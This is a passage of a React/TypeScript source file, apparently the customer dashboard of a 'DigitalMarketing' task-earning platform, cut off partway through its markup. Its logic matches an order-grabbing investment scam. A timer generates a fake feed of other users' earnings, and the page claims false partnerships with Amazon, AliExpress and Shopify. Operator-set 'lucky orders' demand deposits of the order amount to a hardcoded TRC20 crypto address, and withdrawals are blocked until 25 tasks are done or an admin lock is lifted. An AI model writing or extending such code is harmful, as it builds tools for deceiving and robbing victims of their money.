import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { supabase } from '../lib/supabase';

interface ProductTask {
  id: number;
  name: string;
  store: 'Amazon' | 'AliExpress' | 'Shopify';
  price: number;
  commission: number;
  rating: number;
  imageUrl: string;
  isLucky?: boolean;
}

interface ChatMessage {
  id: string;
  sender_id: string;
  receiver_id: string;
  message: string;
  created_at: string;
  is_admin: boolean;
}

const STRICT_UNIQUE_INVENTORY = [
  { name: "Rolex Daytona Platinum Edition", store: "Amazon" as const, price: 185, imageUrl: "https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?w=600&q=80" },
  { name: "Patek Philippe Nautilus Gold", store: "Shopify" as const, price: 210, imageUrl: "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=600&q=80" },
  { name: "Audemars Piguet Royal Oak Chrono", store: "AliExpress" as const, price: 190, imageUrl: "https://images.unsplash.com/photo-1547996160-01ff60023531?w=600&q=80" },
  { name: "Leica M11 Digital Camera", store: "Amazon" as const, price: 150, imageUrl: "https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=600&q=80" },
  { name: "Apple Vision Pro 1TB Gold", store: "Amazon" as const, price: 220, imageUrl: "https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=600&q=80" },
  { name: "Chanel Classic Flap Black Bag", store: "AliExpress" as const, price: 130, imageUrl: "https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=600&q=80" },
  { name: "Cartier Santos Gold Watch", store: "Shopify" as const, price: 175, imageUrl: "https://images.unsplash.com/photo-1524805444758-089113d48a6d?w=600&q=80" },
  { name: "Louis Vuitton Leather Travel Trunk", store: "Amazon" as const, price: 160, imageUrl: "https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=600&q=80" },
  { name: "Prada Saffiano Leather Handbag", store: "Shopify" as const, price: 115, imageUrl: "https://images.unsplash.com/photo-1591561954557-26941169b49e?w=600&q=80" },
  { name: "Hermes Birkin 30 Togo Leather", store: "Amazon" as const, price: 240, imageUrl: "https://images.unsplash.com/photo-1539109136881-3be0616acf4b?w=600&q=80" },
  { name: "Gucci Marmont Velvet Shoulder Bag", store: "AliExpress" as const, price: 95, imageUrl: "https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=600&q=80" },
  { name: "Bvlgari Serpenti Tubogas Watch", store: "Shopify" as const, price: 200, imageUrl: "https://images.unsplash.com/photo-1533139502658-0198f920d8e8?w=600&q=80" }
];

const INTERNAL_PRODUCT_INVENTORY = Array.from({ length: 125 }, (_, index) => {
  const base = STRICT_UNIQUE_INVENTORY[index % STRICT_UNIQUE_INVENTORY.length];
  const variationNumber = Math.floor(index / STRICT_UNIQUE_INVENTORY.length) + 1;
  const nameModifier = variationNumber > 1 ? ` (Model ${variationNumber})` : '';

  return {
    id: index + 1,
    name: `${base.name}${nameModifier}`,
    store: base.store,
    price: base.price,
    rating: 5,
    imageUrl: base.imageUrl
  };
});

const INITIAL_7_TRANSACTIONS = [
  { id: 1, user: 'usr_7857***', amount: 500, time: '10 sec ago' },
  { id: 2, user: 'usr_8660***', amount: 1500, time: '22 sec ago' },
  { id: 3, user: 'usr_1508***', amount: 400, time: '35 sec ago' },
  { id: 4, user: 'usr_9421***', amount: 820, time: '48 sec ago' },
  { id: 5, user: 'usr_3310***', amount: 1250, time: '1 min ago' },
  { id: 6, user: 'usr_6204***', amount: 310, time: '1 min ago' },
  { id: 7, user: 'usr_4819***', amount: 2100, time: '2 min ago' },
];

const SUPPORTED_LANGUAGES = [
  'English', 'Arabic', 'Persian', 'Italian', 'Spanish', 
  'Turkish', 'Russian', 'Urdu', 'Chinese', 'French', 
  'German', 'Portuguese', 'Japanese', 'Korean', 'Hindi'
];

export const CustomerDashboard: React.FC = () => {
  const { user, signOut } = useAuth();
  const [activeTab, setActiveTab] = useState<'home' | 'support' | 'grabbing' | 'records' | 'vip' | 'mine'>('grabbing');
  const [message, setMessage] = useState<{ text: string; type: 'success' | 'error' } | null>(null);

  const [userEmail, setUserEmail] = useState(user?.email || '');
  const [userPhone, setUserPhone] = useState('');
  
  const [myInviteCode, setMyInviteCode] = useState('');

  const usernameDisplay = user?.user_metadata?.username || userEmail.split('@')[0] || 'User';
  const emailDisplay = userEmail.includes('@appuser.local') ? `${usernameDisplay} (Active)` : userEmail;

  const [balance, setBalance] = useState<number>(0.00);
  const [completedTasks, setCompletedTasks] = useState<number>(0);
  const [todayCommission, setTodayCommission] = useState<number>(0.00);
  const [activeVipLevel, setActiveVipLevel] = useState<string>('VIP 0 - Regular');

  const [isGrabbing, setIsGrabbing] = useState<boolean>(false);
  const [currentTask, setCurrentTask] = useState<ProductTask | null>(null);
  const [showFullPageTask, setShowFullPageTask] = useState<boolean>(false);

  const [recordsList, setRecordsList] = useState<ProductTask[]>([]);
  const [liveFeed, setLiveFeed] = useState(INITIAL_7_TRANSACTIONS);
  const [dbProducts, setDbProducts] = useState<any[]>([]);

  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [inputMessage, setInputMessage] = useState('');

  const [showDepositModal, setShowDepositModal] = useState(false);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  const [showWalletBindModal, setShowWalletBindModal] = useState(false);
  const [showSettingsModal, setShowSettingsModal] = useState(false);
  const [showHistoryModal, setShowHistoryModal] = useState<'deposit' | 'withdraw' | null>(null);
  const [infoModal, setInfoModal] = useState<{ title: string; text: string } | null>(null);
  const [showCertModal, setShowCertModal] = useState(false);

  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawPasswordInput, setWithdrawPasswordInput] = useState('');
  const [withdrawLockedMsg, setWithdrawLockedMsg] = useState('');

  const [trc20Address, setTrc20Address] = useState('');
  const [erc20Address, setErc20Address] = useState('');
  const [bankName, setBankName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [isWalletAlreadyBound, setIsWalletAlreadyBound] = useState(false);

  const [adminTrc20DepositAddress, setAdminTrc20DepositAddress] = useState('TYA83kNx9XmR2pQz1L7W4sV6B0c9e5F8dH');
  const [depositHistory, setDepositHistory] = useState<any[]>([]);
  const [withdrawHistory, setWithdrawHistory] = useState<any[]>([]);

  const [newLoginPass, setNewLoginPass] = useState('');
  const [newWithdrawPass, setNewWithdrawPass] = useState('');
  const [selectedLanguage, setSelectedLanguage] = useState('English');

  const quickDepositAmounts = [30, 50, 100, 200, 500, 1000, 2000, 3000, 5000, 7000, 10000];

  const ABOUT_TEXT = `ABOUT DIGITALMARKETING
Digital Marketing is an international legal platform offering genuine earning opportunities through Digital Marketing. We work as a trusted partner with AliExpress, Amazon and Shopify, and manage the finance department to ensure safe, smooth and secure transactions for all our users.`;

  const HOW_IT_WORKS_TEXT = `HOW DIGITALMARKETING WORKS
01. Recharge your account with $30 (minimum)[cite: 14].
02. Your total balance will be activated up to $10,000[cite: 14].
03. Start with 25 tasks (complete all to earn)[cite: 14].
04. Get lucky orders (randomly) for extra high commissions[cite: 14].
05. Place orders on AliExpress, Amazon or Shopify (as per task)[cite: 14].
06. Complete tasks and get commission[cite: 14].
07. Withdraw your earnings (after completing 25 tasks)[cite: 14].
08. Keep working and upgrade to higher VIP levels for more profit[cite: 14].`;

  const RULES_TEXT = `PLATFORM RULES & REGULATIONS
01. Start balance is $30.00. Anyone can recharge and start earning immediately[cite: 14].
02. Complete 25 tasks to get your withdrawal[cite: 14].
03. If your amount is high and digital marketing is required for withdrawal, you must complete customer verification (KYC)[cite: 14].
04. Without verification, your withdrawal will be blocked and deactivated[cite: 14].
05. Keep your account active and follow all platform rules[cite: 14].
06. Use only official platform methods for recharge & withdrawal[cite: 14].
07. Do not share your account details with anyone[cite: 14].
08. Any illegal activity will result in permanent ban[cite: 14].
09. Follow the terms, guidelines and rules strictly[cite: 14].
10. We are not responsible for any false information or third-party activities. Use the platform wisely and safely[cite: 14].`;

  const formatDateWithTime = (dateStr?: string) => {
    const d = dateStr ? new Date(dateStr) : new Date();
    return d.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  };

  useEffect(() => {
    const timer = setInterval(() => {
      const randomUser = `usr_${Math.floor(1000 + Math.random() * 9000)}***`;
      const randomAmt = Math.floor(250 + Math.random() * 2500);
      const newEntry = { id: Date.now(), user: randomUser, amount: randomAmt, time: 'Just now' };

      setLiveFeed((prev) => [newEntry, ...prev.slice(0, 5)]);
    }, 2500);

    return () => clearInterval(timer);
  }, []);

  const syncCustomerPendingTask = async (profileData: any) => {
    if (!user?.id || !profileData) return;

    const completedCount = Number(profileData.completed_tasks || 0);
    const nextTaskNumber = completedCount + 1;

    const { data: luckyOrder, error: luckyOrderError } = await supabase
      .from('custom_tasks')
      .select('*')
      .eq('user_id', user.id)
      .eq('task_number', nextTaskNumber)
      .eq('is_lucky_order', true)
      .eq('is_active', true)
      .eq('status', 'pending')
      .maybeSingle();

    if (luckyOrderError) {
      console.error('Lucky Order sync error:', luckyOrderError.message);
      return;
    }

    if (luckyOrder) {
      const price = Number(luckyOrder.task_amount);

      const rawComm = Number(
        luckyOrder.commission ?? luckyOrder.locked_commission ?? 5
      );

      if (
        !Number.isFinite(price) ||
        price <= 0 ||
        !Number.isFinite(rawComm) ||
        rawComm < 0
      ) {
        console.error('Invalid Lucky Order amount or commission:', luckyOrder.id);
        return;
      }

      const commission =
        rawComm <= 100
          ? Number(((price * rawComm) / 100).toFixed(2))
          : rawComm;

      const luckyTask: ProductTask = {
        id: Number(luckyOrder.task_number),
        name:
          luckyOrder.product_name ||
          luckyOrder.name ||
          'Lucky Order',
        store: luckyOrder.store || 'Shopify',
        price,
        commission,
        rating: 4.9,
        imageUrl:
          luckyOrder.image_url ||
          luckyOrder.imageUrl ||
          'https://images.unsplash.com/photo-1533139502658-0198f920d8e8?w=600&q=80',
        isLucky: true,
      };

      setCurrentTask(luckyTask);
      return;
    }

    const savedTask = profileData.pending_task;

    if (savedTask?.isLucky) {
      setCurrentTask(null);
      return;
    }

    if (savedTask && Number(savedTask.id) > completedCount) {
      setCurrentTask(savedTask);
    } else {
      setCurrentTask(null);
    }
  };

  useEffect(() => {
    if (!user) return;

    const fetchUserProfileAndData = async () => {
      const { data: prodData } = await supabase.from('products').select('*');
      if (prodData && prodData.length > 0) {
        setDbProducts(prodData);
      }

      const { data } = await supabase
        .from('profiles')
        .select('*')
        .eq('id', user.id)
        .maybeSingle();

      if (data) {
        setBalance(Number(data.balance) || 0.00);
        setTodayCommission(Number(data.total_profits) || 0.00);
        if (data.email) setUserEmail(data.email);
        if (data.phone) setUserPhone(data.phone);

        const currentCode = String(data.user_invite_code || data.invitation_code || '').trim();
        setMyInviteCode(currentCode);

        if (data.completed_tasks !== undefined) setCompletedTasks(data.completed_tasks);
        if (data.vip_level) setActiveVipLevel(data.vip_level);
        if (data.withdraw_message) setWithdrawLockedMsg(data.withdraw_message);

        await syncCustomerPendingTask(data);

        if (data.trc20 || data.trc20_address || data.account_number || data.bank_name) {
          setTrc20Address(data.trc20_address || data.trc20 || '');
          setErc20Address(data.erc20 || '');
          setBankName(data.bank_name || '');
          setAccountNumber(data.account_number || '');
          setIsWalletAlreadyBound(true);
        }
      }

      const { data: settingsData } = await supabase
        .from('system_settings')
        .select('*')
        .maybeSingle();

      if (settingsData?.deposit_trc20_address) {
        setAdminTrc20DepositAddress(settingsData.deposit_trc20_address);
      }

      const { data: depData } = await supabase.from('deposits').select('*').eq('user_id', user.id).order('created_at', { ascending: false });
      if (depData) setDepositHistory(depData);

      const { data: witData } = await supabase.from('withdrawals').select('*').eq('user_id', user.id).order('created_at', { ascending: false });
      if (witData) setWithdrawHistory(witData);

      const { data: chatData } = await supabase
        .from('chat_messages')
        .select('*')
        .or(`sender_id.eq.${user.id},receiver_id.eq.${user.id}`)
        .order('created_at', { ascending: true });
      if (chatData) setChatMessages(chatData);
    };

    fetchUserProfileAndData();

    const syncInterval = setInterval(async () => {
      const { data } = await supabase
        .from('profiles')
        .select('*')
        .eq('id', user.id)
        .maybeSingle();

      if (data) {
        setBalance(Number(data.balance) || 0.00);
        setTodayCommission(Number(data.total_profits) || 0.00);
        if (data.completed_tasks !== undefined) setCompletedTasks(data.completed_tasks);
        if (data.vip_level) setActiveVipLevel(data.vip_level);
        if (data.withdraw_message) setWithdrawLockedMsg(data.withdraw_message);

        const { data: depData } = await supabase.from('deposits').select('*').eq('user_id', user.id).order('created_at', { ascending: false });
        if (depData) setDepositHistory(depData);
      }
    }, 2000);

    const channel = supabase
      .channel(`customer-room-${user.id}`)
      .on(
        'postgres_changes',
        { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${user.id}` },
        (payload) => {
          if (payload.new) {
            setBalance(Number(payload.new.balance) || 0.00);
            setTodayCommission(Number(payload.new.total_profits) || 0.00);
            if (payload.new.completed_tasks !== undefined) setCompletedTasks(payload.new.completed_tasks);
            if (payload.new.vip_level) setActiveVipLevel(payload.new.vip_level);
            if (payload.new.withdraw_message) setWithdrawLockedMsg(payload.new.withdraw_message);
            void syncCustomerPendingTask(payload.new);
          }
        }
      )
      .subscribe();

    return () => {
      clearInterval(syncInterval);
      supabase.removeChannel(channel);
    };
  }, [user]);

  const showToast = (text: string, type: 'success' | 'error' = 'success') => {
    setMessage({ text, type });
    setTimeout(() => setMessage(null), 3500);
  };

  const handleSendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputMessage.trim() || !user) return;

    const currentTxt = inputMessage.trim();
    const tempMsgObj: ChatMessage = {
      id: `temp-${Date.now()}`,
      sender_id: user.id,
      receiver_id: 'admin',
      message: currentTxt,
      created_at: new Date().toISOString(),
      is_admin: false,
    };

    setChatMessages((prev) => [...prev, tempMsgObj]);
    setInputMessage('');

    await supabase.from('chat_messages').insert([
      {
        sender_id: user.id,
        receiver_id: 'admin',
        message: currentTxt,
        is_admin: false,
      }
    ]);
  };

  const handleGrabTask = async () => {
    if (isGrabbing) return;

    if (!user?.id) {
      showToast('Please sign in again.');
      return;
    }

    if (completedTasks >= 25) {
      showToast('You have completed all 25 tasks.');
      return;
    }

    setIsGrabbing(true);

    try {
      const nextTaskNumber = completedTasks + 1;

      const { data: luckyOrder, error: luckyOrderError } = await supabase
        .from('custom_tasks')
        .select('*')
        .eq('user_id', user.id)
        .eq('task_number', nextTaskNumber)
        .eq('is_lucky_order', true)
        .eq('is_active', true)
        .eq('status', 'pending')
        .maybeSingle();

      if (luckyOrderError) {
        console.error('Lucky Order load error:', luckyOrderError.message);
      }

      let grabbedProduct: ProductTask;

      if (luckyOrder) {
        const price = Number(luckyOrder.task_amount ?? luckyOrder.locked_price ?? luckyOrder.price ?? 0);
        const rawComm = Number(luckyOrder.commission ?? luckyOrder.locked_commission ?? 5);
        const commission = rawComm > 0 && rawComm <= 100 && price > 0 ? Number(((price * rawComm) / 100).toFixed(2)) : rawComm;

        grabbedProduct = {
          id: Number(luckyOrder.task_number || nextTaskNumber),
          name: luckyOrder.product_name || luckyOrder.name || 'Bvlgari Serpenti Tubogas Watch',
          store: luckyOrder.store || 'Shopify',
          price: price,
          commission: commission,
          rating: 4.9,
          imageUrl: luckyOrder.image_url || luckyOrder.imageUrl || 'https://images.unsplash.com/photo-1533139502658-0198f920d8e8?w=600&q=80',
          isLucky: true,
        };
      } else {
        if (currentTask && currentTask.id > completedTasks) {
          setShowFullPageTask(true);
          return;
        }

        const products = dbProducts.length > 0 ? dbProducts : INTERNAL_PRODUCT_INVENTORY;
        const selectedProduct = products[Math.floor(Math.random() * products.length)] as any;

        const price = Number(selectedProduct.price);

        const minPercent = 0.50;
        const maxPercent = 0.75;
        const percentage = minPercent + Math.random() * (maxPercent - minPercent);

        grabbedProduct = {
          id: nextTaskNumber,
          name: selectedProduct.name,
          store: selectedProduct.store || 'Amazon',
          price,
          commission: Number(((price * percentage) / 100).toFixed(2)),
          rating: Number(selectedProduct.rating || 5),
          imageUrl: selectedProduct.image_url || selectedProduct.imageUrl || '',
          isLucky: false,
        };
      }

      const { error: saveError } = await supabase
        .from('profiles')
        .update({
          pending_task: grabbedProduct,
          running_tasks: 0,
        })
        .eq('id', user.id);

      if (saveError) {
        console.error('Save task error:', saveError.message);
      }

      setCurrentTask(grabbedProduct);
      setShowFullPageTask(true);
    } catch (error) {
      console.error('Grab task error:', error);
      showToast('Unable to load task.');
    } finally {
      setIsGrabbing(false);
    }
  };

  const handleConfirmTask = async () => {
    if (!currentTask || !user) {
      showToast('No active task found. Please select a task again.', 'error');
      return;
    }

    try {
      const completedTask = currentTask;
      const newCompletedCount = completedTasks + 1;

      const newComm = Number((todayCommission + completedTask.commission).toFixed(2));
      const newBal = Number((balance + completedTask.commission).toFixed(2));

      if (completedTask.isLucky) {
        await supabase
          .from('custom_tasks')
          .update({
            status: 'completed',
            is_active: false
          })
          .eq('user_id', user.id)
          .eq('task_number', completedTask.id);
      }

      const { error: profileError } = await supabase
        .from('profiles')
        .update({
          balance: newBal,
          total_profits: newComm,
          completed_tasks: newCompletedCount,
          running_tasks: 0,
          pending_task: null,
        })
        .eq('id', user.id);

      if (profileError) throw profileError;

      setCompletedTasks(newCompletedCount);
      setTodayCommission(newComm);
      setBalance(newBal);
      setRecordsList((prev) => [completedTask, ...prev]);

      setCurrentTask(null);
      setShowFullPageTask(false);

      showToast(
        `Task #${completedTask.id} completed! Commission: +$${completedTask.commission.toFixed(2)}.`,
        'success'
      );
    } catch (err: any) {
      showToast(
        err?.message || 'Could not complete the task. Please try again.',
        'error'
      );
    }
  };

  const handleDepositSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!user) {
      showToast('Please sign in again.', 'error');
      return;
    }

    const isLuckyOrder = Boolean(currentTask?.isLucky);
    const requestedAmount = Number(depositAmount);

    if (!isLuckyOrder && (!depositAmount || !Number.isFinite(requestedAmount) || requestedAmount <= 0)) {
      showToast('Please enter a valid deposit amount.', 'error');
      return;
    }

    try {
      let amountToDeposit = requestedAmount;
      let linkedTaskId: string | null = null;

      if (isLuckyOrder && currentTask) {
        const { data: order, error: orderError } = await supabase
          .from('custom_tasks')
          .select('id, task_amount, status, is_active, funding_status')
          .eq('user_id', user.id)
          .eq('task_number', currentTask.id)
          .eq('is_lucky_order', true)
          .eq('status', 'pending')
          .eq('is_active', true)
          .maybeSingle();

        if (orderError) throw orderError;

        if (!order) {
          showToast('Lucky Order not found. Please refresh and try again.', 'error');
          return;
        }

        if (order.funding_status === 'funded') {
          showToast('This Lucky Order is already funded.', 'error');
          return;
        }

        amountToDeposit = Number(order.task_amount);
        linkedTaskId = order.id;

        if (!Number.isFinite(amountToDeposit) || amountToDeposit <= 0) {
          showToast('Invalid Lucky Order amount. Please contact support.', 'error');
          return;
        }
      }

      const depositPayload: {
        user_id: string;
        amount: number;
        trc20_address: string;
        status: string;
        custom_task_id?: string;
      } = {
        user_id: user.id,
        amount: amountToDeposit,
        trc20_address: adminTrc20DepositAddress,
        status: 'pending',
      };

      if (linkedTaskId) {
        depositPayload.custom_task_id = linkedTaskId;
      }

      const { error: insertError } = await supabase
        .from('deposits')
        .insert([depositPayload]);

      if (insertError) throw insertError;

      showToast(
        isLuckyOrder
          ? `New Lucky Order deposit request of $${amountToDeposit.toFixed(2)} submitted.`
          : `Deposit request of $${amountToDeposit.toFixed(2)} submitted successfully!`,
        'success'
      );

      setShowDepositModal(false);
      setDepositAmount('');

      const { data: depData, error: historyError } = await supabase
        .from('deposits')
        .select('*')
        .eq('user_id', user.id)
        .order('created_at', { ascending: false });

      if (historyError) {
        console.error('Deposit history error:', historyError.message);
      } else if (depData) {
        setDepositHistory(depData);
      }
    } catch (err: any) {
      showToast(err?.message || 'Could not submit deposit request.', 'error');
    }
  };

  const handleWalletBindSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!user) return;

    if (isWalletAlreadyBound) {
      showToast('Please contact customer service to replace your account.', 'error');
      setShowWalletBindModal(false);
      return;
    }

    if (!trc20Address && !bankName) {
      showToast('Please enter your TRC20 or bank account details.', 'error');
      return;
    }

    const { error } = await supabase
      .from('profiles')
      .update({
        trc20: trc20Address,
        trc20_address: trc20Address,
        erc20: erc20Address,
        bank_name: bankName,
        account_number: accountNumber,
      })
      .eq('id', user.id);

    if (!error) {
      setIsWalletAlreadyBound(true);
      showToast('Wallet and bank details bound successfully!');
      setShowWalletBindModal(false);
    } else {
      showToast(`Wallet Bind Error: ${error.message}`, 'error');
    }
  };

  const handleSecurityUpdateSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!user) return;

    const { error: profileError } = await supabase
      .from('profiles')
      .update({
        email: userEmail,
        phone: userPhone,
      })
      .eq('id', user.id);

    if (profileError) {
      showToast(`Profile update error: ${profileError.message}`, 'error');
      return;
    }

    if (newLoginPass) {
      const { error } = await supabase.auth.updateUser({
        password: newLoginPass,
      });

      if (error) {
        showToast(`Login password error: ${error.message}`, 'error');
        return;
      }
    }

    if (newWithdrawPass) {
      const { error } = await supabase
        .from('profiles')
        .update({ withdraw_password: newWithdrawPass })
        .eq('id', user.id);

      if (error) {
        showToast(`Withdrawal password update error: ${error.message}`, 'error');
        return;
      }
    }

    showToast('Profile credentials updated successfully!');
    setShowSettingsModal(false);
    setNewLoginPass('');
    setNewWithdrawPass('');
  };

  const handleWithdrawSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const amt = Number(withdrawAmount);

    if (!user) {
      showToast('Please sign in again.', 'error');
      return;
    }

    if (withdrawLockedMsg) {
      showToast(`Withdrawal Locked: ${withdrawLockedMsg}`, 'error');
      return;
    }

    if (completedTasks < 25) {
      showToast('Withdrawal Locked: Complete all 25 daily tasks first!', 'error');
      return;
    }

    if (!withdrawAmount || !Number.isFinite(amt) || amt <= 0 || !withdrawPasswordInput) {
      showToast('Please enter a valid amount and withdrawal password.', 'error');
      return;
    }

    if (amt > balance) {
      showToast('Insufficient balance for withdrawal!', 'error');
      return;
    }

    const { error } = await supabase
      .from('withdrawals')
      .insert([
        {
          user_id: user.id,
          amount: amt,
          trc20_address: trc20Address || 'User Wallet',
          status: 'pending',
        },
      ]);

    if (error) {
      showToast(`Withdrawal Error: ${error.message}`, 'error');
      return;
    }

    showToast(`Withdrawal request for $${amt.toFixed(2)} submitted successfully!`);
    setShowWithdrawModal(false);
    setWithdrawAmount('');
    setWithdrawPasswordInput('');

    const { data: witData, error: historyError } = await supabase
      .from('withdrawals')
      .select('*')
      .eq('user_id', user.id)
      .order('created_at', { ascending: false });

    if (historyError) {
      console.error('Withdrawal history error:', historyError.message);
    } else if (witData) {
      setWithdrawHistory(witData);
    }
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      showToast('TRC20 Address copied!', 'success');
    } catch {
      showToast('Could not copy address. Please copy it manually.', 'error');
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#050508] text-amber-100 pb-28 relative font-sans overflow-x-hidden">
      
      {/* HEADER */}
      <div className="pt-4 pb-2 px-4 text-center border-b border-[#d4af37]/30 bg-gradient-to-b from-[#181408] to-transparent">
        <div className="inline-flex items-center space-x-2">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-[#d4af37] via-[#f3e5ab] to-[#d4af37] flex items-center justify-center shadow-[0_0_15px_rgba(212,175,55,0.4)]">
            <span className="text-xl font-black text-black">📈</span>
          </div>
          <div className="text-left">
            <h1 className="text-lg font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-[#f3e5ab] via-white to-[#d4af37]">
              DigitalMarketing
            </h1>
            <p className="text-[8px] font-bold text-[#d4af37] tracking-widest uppercase">
              GROW • EARN • SUCCEED[cite: 14]
            </p>
          </div>
        </div>
      </div>

      <div className="max-w-md mx-auto w-full px-4 pt-4 space-y-4 relative z-10">
        
        {message && (
          <div
            className={`p-3.5 text-xs font-bold text-center rounded-2xl shadow-xl border backdrop-blur-md ${
              message.type === 'error'
                ? 'bg-red-950/90 border-red-500 text-white'
                : 'bg-[#181008]/90 border-[#d4af37] text-[#f3e5ab]'
            }`}
          >
            {message.text}
          </div>
        )}

        {/* MINE TAB */}
        {activeTab === 'mine' && (
          <div className="space-y-4">
            <div className="bg-[#0b0c10] border-2 border-[#d4af37]/70 rounded-3xl p-4 shadow-xl flex items-center justify-between">
              <div className="flex items-center space-x-3">
                <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-[#d4af37] via-[#f3e5ab] to-[#d4af37] p-0.5 shadow-lg">
                  <div className="w-full h-full bg-black rounded-[14px] flex items-center justify-center text-xl">👤</div>
                </div>
                <div>
                  <h3 className="text-sm font-black text-white tracking-wide">{usernameDisplay}</h3>
                  <p className="text-[10px] text-[#f3e5ab] font-medium mt-0.5">● {emailDisplay}</p>
                </div>
              </div>
              <div className="text-right space-y-1">
                <div className="px-3 py-1 bg-[#d4af37]/10 border border-[#d4af37] text-[#f3e5ab] text-[10px] font-bold rounded-full">👑 {activeVipLevel}</div>
                <div className="text-[9px] font-mono text-emerald-400 font-bold px-1">Invite: {myInviteCode || 'None'}</div>
              </div>
            </div>

            <div className="bg-[#0b0c10] border-2 border-[#d4af37]/70 rounded-3xl p-5 shadow-2xl space-y-4">
              <div className="grid grid-cols-2 gap-4 text-center divide-x divide-[#d4af37]/30">
                <div>
                  <p className="text-[9px] text-[#d4af37] uppercase font-bold tracking-wider">TOTAL BALANCE</p>
                  <h3 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-[#f3e5ab] to-[#d4af37] mt-0.5">${balance.toFixed(2)}</h3>
                </div>
                <div className="pl-4">
                  <p className="text-[9px] text-[#d4af37] uppercase font-bold tracking-wider">TOTAL PROFITS</p>
                  <h3 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-[#f3e5ab] to-[#d4af37] mt-0.5">${todayCommission.toFixed(2)}</h3>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-3 pt-1">
                <button onClick={() => setShowDepositModal(true)} className="py-3 bg-gradient-to-r from-[#d4af37] via-[#f3e5ab] to-[#d4af37] text-black font-black text-xs rounded-2xl shadow-lg flex items-center justify-center space-x-1.5 uppercase tracking-wider">
                  <span>👛</span><span>DEPOSIT</span>
                </button>
                <button onClick={() => setShowWithdrawModal(true)} className="py-3 bg-[#18150a] border-2 border-[#d4af37] text-[#f3e5ab] font-black text-xs rounded-2xl shadow flex items-center justify-center space-x-1.5 uppercase tracking-wider">
                  <span>🏦</span><span>WITHDRAW</span>
                </button>
              </div>
            </div>

            <div className="bg-[#0b0c10] border border-[#d4af37]/50 rounded-3xl shadow-xl overflow-hidden divide-y divide-[#d4af37]/20">
              <button onClick={() => setShowHistoryModal('deposit')} className="w-full p-4 flex justify-between items-center text-xs font-bold text-white hover:bg-[#18150a]">
                <span>🪙 Deposit History</span>
                <span className="text-[#d4af37]">➔</span>
              </button>
              <button onClick={() => setShowHistoryModal('withdraw')} className="w-full p-4 flex justify-between items-center text-xs font-bold text-white hover:bg-[#18150a]">
                <span>👛 Withdraw History</span>
                <span className="text-[#d4af37]">➔</span>
              </button>
              <button onClick={() => setShowWalletBindModal(true)} className="w-full p-4 flex justify-between items-center text-xs font-bold text-white hover:bg-[#18150a]">
                <span>🔗 Wallet & Bank Binding</span>
                <span className="text-[#d4af37]">➔</span>
              </button>
              <button onClick={() => setShowSettingsModal(true)} className="w-full p-4 flex justify-between items-center text-xs font-bold text-white hover:bg-[#18150a]">
                <span>📧 Profile Settings & Passwords</span>
                <span className="text-[#d4af37]">➔</span>
              </button>
            </div>

            <div className="bg-[#0b0c10] border border-[#d4af37]/50 p-4 rounded-3xl shadow-xl flex justify-between items-center">
              <span className="text-xs font-bold text-white">🌐 Language</span>
              <select value={selectedLanguage} onChange={(e) => setSelectedLanguage(e.target.value)} className="bg-[#18150a] border border-[#d4af37] text-[#f3e5ab] font-bold text-xs rounded-xl px-3 py-1.5">
                {SUPPORTED_LANGUAGES.map((lang) => (<option key={lang} value={lang}>{lang}</option>))}
              </select>
            </div>

            <button onClick={signOut} className="w-full py-3.5 bg-gradient-to-r from-red-900 via-red-600 to-red-900 border border-red-500 text-white font-black text-xs rounded-2xl shadow-lg transition uppercase tracking-wider">
              🔒 LOG OUT ACCOUNT
            </button>
          </div>
        )}

        {/* HOME TAB */}
        {activeTab === 'home' && (
          <div className="space-y-4">
            <div className="grid grid-cols-4 gap-2 text-center">
              <button onClick={() => setInfoModal({ title: 'About Us', text: ABOUT_TEXT })} className="p-2.5 bg-[#0b0c10] border border-[#d4af37] rounded-2xl shadow flex flex-col items-center">
                <span className="text-lg">👥</span><span className="text-[9px] font-black text-[#f3e5ab]">About Us</span>
              </button>
              <button onClick={() => setInfoModal({ title: 'Platform Rules', text: RULES_TEXT })} className="p-2.5 bg-[#0b0c10] border border-[#d4af37] rounded-2xl shadow flex flex-col items-center">
                <span className="text-lg">📋</span><span className="text-[9px] font-black text-[#f3e5ab]">Rules</span>
              </button>
              <button onClick={() => setInfoModal({ title: 'How It Works', text: HOW_IT_WORKS_TEXT })} className="p-2.5 bg-[#0b0c10] border border-[#d4af37] rounded-2xl shadow flex flex-col items-center">
                <span className="text-lg">⚙️</span><span className="text-[9px] font-black text-[#f3e5ab]">How Works</span>
              </button>
              <button onClick={() => setShowCertModal(true)} className="p-2.5 bg-[#0b0c10] border border-[#d4af37] rounded-2xl shadow flex flex-col items-center">
                <span className="text-lg">📜</span><span className="text-[9px] font-black text-[#f3e5ab]">Certificate</span>
              </button>
            </div>

            <div className="bg-[#0b0c10] border-2 border-[#d4af37] p-3.5 rounded-3xl shadow-xl space-y-2">
